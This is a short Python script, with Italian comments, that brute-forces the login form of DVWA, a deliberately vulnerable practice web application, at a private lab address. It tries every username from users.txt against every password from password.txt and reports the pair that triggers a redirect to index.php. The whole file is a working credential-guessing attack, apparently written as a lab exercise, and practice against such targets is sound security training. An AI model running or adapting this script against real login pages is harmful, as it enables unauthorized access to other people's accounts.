import http.client, urllib.parse

"""
POST /dvwa/login.php HTTP/1.1
Host: 192.168.50.101
username=admin&password=password&Login=Login
"""
# leggo utenti dal file users.txt
username_file = open("users.txt")
# leggo password dal file passowd.txt
pass_file = open("password.txt")

# trasformiamo in liste leggibili dal ciclo for
user_list = username_file.readlines()
pass_list = pass_file.readlines()

for user in user_list:
    user = user.rstrip()
    for pwd in pass_list:
        pwd = pwd.rstrip()

        print(f"Sto testando {user} - {pwd}")

        post_parm = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': 'Login'})

        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml"
                   }
        conn = http.client.HTTPConnection("192.168.50.101", 80)
        conn.request("POST", "/dvwa/login.php", post_parm, headers)
        response = conn.getresponse()

        if(response.getheader("Location") == "index.php"):
            print(f"Loggato come {user} - {pwd}")


